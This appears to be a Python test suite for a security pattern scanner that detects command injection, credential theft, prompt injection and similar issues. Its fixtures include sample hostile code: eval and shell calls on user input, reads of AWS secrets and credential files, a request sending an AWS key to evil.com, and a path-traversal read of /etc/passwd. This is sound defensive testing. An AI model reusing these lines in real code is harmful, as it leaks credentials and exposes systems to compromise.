#!/usr/bin/env python3
"""
Test Suite for Unified Pattern Registry
Tests pattern compilation, caching, and detection accuracy
"""

import sys
import time
import unittest
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.analyzers.unified_pattern_registry import UnifiedPatternRegistry


class TestUnifiedPatternRegistry(unittest.TestCase):
    """Test unified pattern registry functionality"""

    def setUp(self):
        """Set up test registry"""
        self.registry = UnifiedPatternRegistry()

    def test_singleton_pattern(self):
        """Test that registry is a singleton"""
        registry2 = UnifiedPatternRegistry()
        self.assertIs(self.registry, registry2, "Registry should be singleton")

    def test_pattern_compilation(self):
        """Test that all patterns are pre-compiled"""
        for category in self.registry.get_all_categories():
            patterns = self.registry.get_patterns(category)
            self.assertIsInstance(patterns, list)
            for pattern, metadata in patterns:
                # Check pattern is compiled
                self.assertTrue(hasattr(pattern, 'match'),
                               f"Pattern in {category} not compiled")
                # Check metadata exists
                self.assertIn('severity', metadata)
                self.assertIn('name', metadata)

    def test_pattern_count(self):
        """Test that we have expected number of patterns"""
        count = self.registry.get_pattern_count()
        self.assertGreater(count, 50, "Should have at least 50 patterns")

        # Check category distribution
        stats = self.registry.get_pattern_stats()
        self.assertGreater(stats['categories'], 8, "Should have at least 8 categories")

    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        test_cases = [
            ("exec(user_input + cmd)", True, "exec_with_concat"),
            ("eval(request.form['code'])", True, "eval_general"),
            ("subprocess.run(cmd, shell=True)", True, "subprocess_shell"),
            ("os.system(f'ls {path}')", True, "os_system_fstring"),
            ("print('hello')", False, None),
        ]

        for code, should_detect, expected_pattern in test_cases:
            matches = self.registry.scan_content(code, ['command_injection'])
            if should_detect:
                self.assertGreater(len(matches), 0,
                                  f"Should detect threat in: {code}")
                if expected_pattern:
                    self.assertEqual(matches[0].pattern_name, expected_pattern)
            else:
                self.assertEqual(len(matches), 0,
                               f"Should not detect threat in: {code}")

    def test_credential_theft_detection(self):
        """Test credential theft pattern detection"""
        test_cases = [
            ("os.environ.get('AWS_SECRET_ACCESS_KEY')", True, "CRITICAL"),
            ("key = os.environ['AWS_SECRET_ACCESS_KEY']", True, "CRITICAL"),
            ("with open('.aws/credentials') as f:", True, "CRITICAL"),
            ("api_key = 'hardcoded123'", True, "HIGH"),
            ("password = 'admin123'", True, "HIGH"),
            ("message = 'hello world'", False, None),
        ]

        for code, should_detect, expected_severity in test_cases:
            matches = self.registry.scan_content(code, ['credential_theft'])
            if should_detect:
                self.assertGreater(len(matches), 0,
                                  f"Should detect credential theft in: {code}")
                if expected_severity:
                    self.assertEqual(matches[0].severity, expected_severity)
            else:
                self.assertEqual(len(matches), 0,
                               f"Should not detect credential theft in: {code}")

    def test_pattern_performance(self):
        """Test pattern matching performance"""
        # Large code sample
        large_code = """
import os
import subprocess
import requests

def process_user_input(user_data):
    # Some safe code
    result = calculate_something(user_data)
    
    # Dangerous code
    exec(user_data['code'])
    eval(user_data['expression'])
    subprocess.run(user_data['command'], shell=True)
    
    # Credential access
    aws_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
    api_key = 'sk-1234567890abcdef'
    
    # Network requests
    requests.post('http://evil.com', data={'key': aws_key})
    
    # Path traversal
    with open('../../etc/passwd') as f:
        content = f.read()
    
    return result
""" * 100  # Repeat to make it larger

        start = time.perf_counter()
        matches = self.registry.scan_content(large_code)
        duration = time.perf_counter() - start

        self.assertLess(duration, 0.5,
                       f"Pattern scanning too slow: {duration:.3f}s")
        self.assertGreater(len(matches), 0, "Should find threats in large code")

    def test_caching_effectiveness(self):
        """Test that pattern caching works"""
        # First call (already cached at init)
        start = time.perf_counter()
        patterns1 = self.registry.get_patterns('command_injection')
        time1 = time.perf_counter() - start

        # Second call (should be instant from cache)
        start = time.perf_counter()
        patterns2 = self.registry.get_patterns('command_injection')
        time2 = time.perf_counter() - start

        # Should be same object (cached)
        self.assertIs(patterns1, patterns2)

        # Second call should be faster (both are very fast, so just check it's not slower)
        self.assertLessEqual(time2, time1 * 1.5,
                       "Caching not working properly")

    def test_all_categories(self):
        """Test each category has working patterns"""
        categories = [
            'command_injection',
            'data_exfiltration',
            'credential_theft',
            'path_traversal',
            'obfuscation',
            'ssrf',
            'prompt_injection',
            'mcp_specific',
            'unsafe_deserialization'
        ]

        for category in categories:
            patterns = self.registry.get_patterns(category)
            self.assertGreater(len(patterns), 0,
                             f"Category {category} has no patterns")

    def test_pattern_metadata(self):
        """Test pattern metadata is complete"""
        for category in self.registry.get_all_categories():
            patterns = self.registry.get_patterns(category)
            for pattern, metadata in patterns:
                # Check required metadata
                self.assertIn('severity', metadata)
                self.assertIn('name', metadata)

                # Check severity values
                self.assertIn(metadata['severity'],
                            ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'])

                # Check CWE for security patterns (skip dynamically added test patterns)
                if category != 'mcp_specific' and metadata['severity'] != 'INFO' and metadata['name'] != 'test':
                    self.assertIn('cwe', metadata,
                                 f"Missing CWE for {metadata['name']}")

    def test_export_import(self):
        """Test pattern export and import"""
        # Export patterns
        exported = self.registry.export_patterns()

        self.assertIn('version', exported)
        self.assertIn('patterns', exported)
        self.assertIn('stats', exported)

        # Create new registry and import
        new_registry = UnifiedPatternRegistry()
        original_count = new_registry.get_pattern_count()

        # Add a test pattern
        new_registry.add_pattern('test_category', r'test_pattern',
                                {'severity': 'HIGH', 'name': 'test'})

        # Should have one more pattern
        self.assertEqual(new_registry.get_pattern_count(), original_count + 1)

    def test_line_number_tracking(self):
        """Test that line numbers are correctly tracked"""
        code = """line1
line2 with exec(dangerous)
line3
line4 with eval(code)
line5"""

        matches = self.registry.scan_content(code, ['command_injection'])

        # Should find exec on line 2 and eval on line 4
        line_numbers = [m.line_number for m in matches]
        self.assertIn(2, line_numbers, "Should find exec on line 2")
        self.assertIn(4, line_numbers, "Should find eval on line 4")

    def test_false_positive_prevention(self):
        """Test that we don't have obvious false positives"""
        safe_code = """
# This is a comment about exec() and eval()
print("The exec function is dangerous")
logger.info("Never use eval with user input")
EXEC_CONSTANT = "exec"
eval_function_name = "eval"
"""

        matches = self.registry.scan_content(safe_code, ['command_injection'])

        # Should not detect these as actual threats
        for match in matches:
            self.assertNotIn('exec_with_concat', match.pattern_name)
            self.assertNotIn('eval_with_concat', match.pattern_name)


class TestPatternAccuracy(unittest.TestCase):
    """Test pattern detection accuracy"""

    def setUp(self):
        self.registry = UnifiedPatternRegistry()

    def test_mcp_specific_patterns(self):
        """Test MCP-specific pattern detection"""
        mcp_code = """
@mcp.handler
def handle_request(request):
    mcp.server()
    result = mcp.execute(user_input)
    mcp.tool(eval)
    return result
"""

        matches = self.registry.scan_content(mcp_code, ['mcp_specific'])

        pattern_names = [m.pattern_name for m in matches]
        self.assertIn('mcp_handler_decorator', pattern_names)
        self.assertIn('mcp_server_init', pattern_names)
        self.assertIn('mcp_execute_user_input', pattern_names)
        self.assertIn('mcp_tool_eval', pattern_names)

    def test_prompt_injection_patterns(self):
        """Test prompt injection detection"""
        test_cases = [
            ("prompt = user_input + system_prompt", True),
            ("message = f'System: {user_message}'", True),
            ("query = template.format(user=input)", True),
            ("system_prompt = clean_input(user_input)", True),
            ("greeting = 'Hello, world!'", False),
        ]

        for code, should_detect in test_cases:
            matches = self.registry.scan_content(code, ['prompt_injection'])
            if should_detect:
                self.assertGreater(len(matches), 0,
                                  f"Should detect prompt injection in: {code}")
            else:
                self.assertEqual(len(matches), 0,
                               f"False positive in: {code}")


def run_tests():
    """Run all pattern registry tests"""
    print("\n" + "="*60)
    print("UNIFIED PATTERN REGISTRY TEST SUITE")
    print("="*60)

    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add test classes
    suite.addTests(loader.loadTestsFromTestCase(TestUnifiedPatternRegistry))
    suite.addTests(loader.loadTestsFromTestCase(TestPatternAccuracy))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Print summary
    print("\n" + "="*60)
    print("TEST RESULTS SUMMARY")
    print("="*60)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
